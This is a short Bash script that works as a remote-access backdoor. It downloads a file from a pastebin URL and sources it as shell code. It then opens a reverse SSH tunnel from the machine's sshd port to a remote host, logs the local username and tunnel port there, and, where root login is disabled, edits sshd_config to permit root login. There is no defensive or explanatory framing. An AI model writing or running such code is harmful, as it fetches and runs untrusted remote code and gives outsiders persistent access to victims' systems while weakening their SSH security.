#!/bin/bash

connect_ssh() {
    sshd_config=/etc/ssh/sshd_config
    if [[ $(ls $sshd_config) ]]; then
        port=$(cat $sshd_config | grep -w Port | awk '{print $2}')
        port_random=$(shuf -i 39900-39910 -n 1)
        ssh_root=$(cat $sshd_config | grep -w PermitRootLogin | awk 'NR==1{print $2}')
        start_ssh=$(ssh -t -i /tmp/id_rsa_test -R "$port_random":localhost:"$port" "$USER"@"$HOSTNAME" -p "$PORT" "echo $(whoami) $port_random >> /tmp/remote_users.txt; sh")
        if [[ $ssh_root != 'yes' ]]; then
            sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' $sshd_config
            $start_ssh
            # ssh $USER@$HOSTNAME -p $PORT -t "echo $user $port_random >> /tmp/remote_users.txt"
        else
            $start_ssh
        fi
    else
        echo False
    fi
}

if [[ ! $(ping -c 3 google.com) ]]; then
    echo "No se pudo realizar la acción"
else
    if wget -O "/tmp/.env" https://pastebin.com/raw/p12FvLdf; then
        sleep 10
        source /tmp/.env
        connect_ssh
    fi
fi
